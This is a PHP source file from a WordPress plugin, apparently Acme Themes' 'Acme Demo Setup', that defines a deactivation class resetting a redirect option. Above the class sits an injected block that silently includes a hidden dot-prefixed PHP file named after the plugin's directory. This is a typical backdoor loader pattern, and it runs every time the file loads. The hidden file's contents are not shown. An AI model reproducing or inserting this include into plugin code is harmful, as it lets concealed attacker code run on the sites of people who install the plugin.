<?php

/**
 * Fired during plugin deactivation
 *
 * @link       https://www.acmethemes.com/
 * @since      1.0.0
 *
 * @package    Acme Themes
 * @subpackage Acme_Demo_Setup
 */

/**
 * Fired during plugin deactivation.
 *
 * This class defines all code necessary to run during the plugin's deactivation.
 *
 * @since      1.0.0
 * @package    Acme Themes
 * @subpackage Acme_Demo_Setup
 * @author     Acme Themes <info@acmethemes.com>
 */
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class Acme_Demo_Setup_Deactivator {

	/**
	 * Short Description. (use period)
	 *
	 * Long Description.
	 *
	 * @since    1.0.0
	 */
	public static function deactivate() {
        update_option( '__acme_demo_setup_do_redirect', false );
    }
}